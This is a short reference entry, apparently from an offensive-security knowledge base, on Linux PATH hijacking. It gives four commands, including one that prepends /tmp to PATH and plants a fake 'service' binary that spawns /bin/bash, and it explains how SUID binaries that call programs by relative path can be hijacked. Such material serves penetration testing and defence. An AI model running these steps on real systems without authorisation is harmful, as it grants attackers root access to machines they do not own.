---
id: priv-007
title: "PATH Hijacking"
category: privilege_escalation
tags: [path-hijacking, environment-variable, linux-privesc, binary-substitution]
platform: [linux]
commands:
  - "echo $PATH && find / -writable -type d 2>/dev/null | grep -v proc"
  - "strings /usr/local/bin/suid-binary | grep -v '/' | grep -E '^[a-z]'"
  - "export PATH=/tmp:$PATH && echo '/bin/bash' > /tmp/service && chmod +x /tmp/service"
  - "strace -e execve /usr/local/bin/suid-binary 2>&1 | grep exec"
references:
  - "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#path"
  - "https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/"
---

PATH hijacking exploits SUID/SGID binaries or sudo-allowed scripts that call other programs using relative paths rather than absolute paths, allowing an attacker to substitute a malicious binary by prepending a writable directory to the PATH environment variable. The attack begins by identifying SUID binaries that call commands without full paths, which can be discovered using `strings` on the binary or `strace` to observe `execve` syscalls at runtime. Once a vulnerable call is identified, placing a malicious script with the same name in a directory that appears earlier in PATH causes the privileged binary to execute the attacker's code with elevated permissions.
